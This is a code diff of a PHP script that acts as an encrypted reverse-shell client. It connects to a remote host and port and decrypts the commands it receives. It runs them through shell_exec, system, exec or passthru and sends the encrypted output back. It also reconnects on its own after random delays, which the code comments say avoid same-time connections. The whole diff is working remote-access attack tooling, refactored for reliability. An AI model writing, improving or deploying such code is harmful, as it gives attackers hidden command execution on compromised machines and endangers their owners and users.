@@ -2,121 +2,106 @@
 <?php
 	set_time_limit(0);
 	ob_implicit_flush(1);
+	define("BUFFER_LEN", 4096);
 
 	$short = "h:p:";
-	$long  = array(
-		"host:",
-		"port:"
-	);
+	$long  = ["host:", "port:"];
 	$opts  = getopt($short,$long);
+	$opensslpath = './Openssl_EncryptDecrypt.php';
 
-	(count($opts) === 2) or die("Assign remote ip [-h/--host] and port [-p/--port]\n");
+	(count($opts) === 2) || die("Assign remote ip [-h/--host] and port [-p/--port]\n");
+	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
+	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
-	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
-	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
-
-	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) or die("[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n");
+	($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
+		|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
+				.socket_strerror(socket_last_error())."\n");
 
 	echo "Connecting to [".$addr.":".$port."]...\n";
+	(@$result = socket_connect($socket, $addr, $port))
+		|| die("[\33[91m!\33[0m] socket_connect failed: reason: "
+				.socket_strerror(socket_last_error($socket))."\n");
 
-	(@$result = socket_connect($socket, $addr, $port)) or die("[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n");
-
-
-	require_once 'Openssl_EncryptDecrypt.php';
-	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	if(file_exists($opensslpath)){
+		require_once $opensslpath;
+		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	} else { die('error: openssl class missing'); }
 
 	// TODO:: if key !exists wait-for-key
-
 	if(($key = $openssl_encrypt_decrypt->fetch_key()) !== false){
-		if(! defined('ENCRYPTION_KEY')){
+		if(!defined('ENCRYPTION_KEY')){
 			define('ENCRYPTION_KEY', $key);
-		} else {
-			die('failed to fetch key.');
-		}
+		} else { die('error: failed to fetch key.'); }
 	}
 
-
 	echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
-
-	while (true)
+	while (1)
 	{
 		$now = date('d/m H:i:s');
-	    if(! ($recv = socket_read($socket, 4096)) || $recv === "")
+	    if(!($recv = @socket_read($socket, BUFFER_LEN)) || $recv === "")
 	    {
-	    	// try to reconnect - 10 sec interval
+			// try to reconnect - 1-5 sec interval
+			// rand() to avoid same-time-connections
+			socket_close($socket);
 	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
-			sleep(3);
+			sleep(rand(1,5)); //
 			
-    		if (! ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))) {
-	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
+    		if(!($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))){
+				echo "[\33[91m!\33[0m] socket_create() failed: reason: "
+					.socket_strerror(socket_last_error())."\n";
 			}
 
 			echo "Connecting to [".$addr.":".$port."]...\n";
-
-			if (! (@$result = socket_connect($socket, $addr, $port))){
-			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
-			} 
-			else  {
-				echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n";
-			}
+			if (!(@$result = socket_connect($socket, $addr, $port))){
+				echo "[\33[91m!\33[0m] socket_connect failed: reason: "
+					.socket_strerror(socket_last_error($socket))."\n";
+			} else { echo "\33[32mConnected to host [".$addr.":".$port."]\33[0m\n"; }
 		}
 	    else
 	    {
 			$recv = $openssl_encrypt_decrypt->decrypt_cbc($recv, ENCRYPTION_KEY);
-
-	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)){
-	    		break;
-	    	}
+			if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)){ break; }
 
 			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
 			$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
 
 			if(function_exists('shell_exec')){
 				$fnc = "shell_exec()";
-				if(($result = shell_exec($full_cmd)) === null){
-					$result = "Error";
-				}
-
-			} else if(function_exists('system')){ 	
+				if(($result = shell_exec($full_cmd)) === null){ $result = "Error"; }
+			}
+			else if(function_exists('system')
+					&& function_exists('ob_start')
+					&& function_exists('ob_end_clean'))
+			{ 	
 				$fnc = "system()";
-				@ob_start(); 	
-
-				if(! ($result = @system($full_cmd))){
-					$result = "Error";
-				}
-
+				@ob_start();
+				if(! ($result = @system($full_cmd))){ $result = "Error"; }
 				$result = @ob_get_contents(); 		
 				@ob_end_clean(); 
-
-			} else if(function_exists('exec')){ 
+			}
+			else if(function_exists('exec')){ 
 				$fnc = "exec()";
 				@exec($full_cmd,$results,$ret_status);
-
-				if($ret_status !== 0){
-					$result = "Error status: ". $ret_status;
-				}
+				if($ret_status !== 0){ $result = "Error status: ". $ret_status; }
 				$result = ""; 		
-				foreach($results as $res){ 			
-					$result .= $res."\n\r"; 		
-				} 
-
-			} else if(function_exists('passthru')){ 		
+				foreach($results as $res){ $result .= $res."\n\r"; }
+			}
+			else if(function_exists('passthru')
+					&& function_exists('ob_start')
+					&& function_exists('ob_end_clean'))
+			{
 				$fnc = "passthru()";
 				@ob_start(); 		
 				@passthru($full_cmd); 		
 				$result = @ob_get_contents(); 		
 				@ob_end_clean(); 
-
-			} else {
-				$result = "Error :: System calls disabled..";
 			}
+			else { $result = "Error :: System calls disabled.."; }
 
 			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
 			$result = $openssl_encrypt_decrypt->encrypt_cbc($result, ENCRYPTION_KEY);
 
-    		if(! socket_write($socket, $result ,strlen($result))){	
-    			continue;
-	        }
+    		if(!socket_write($socket, $result ,strlen($result))) {	continue; }
 	    }
 	}
 	echo "Closing socket.\n";
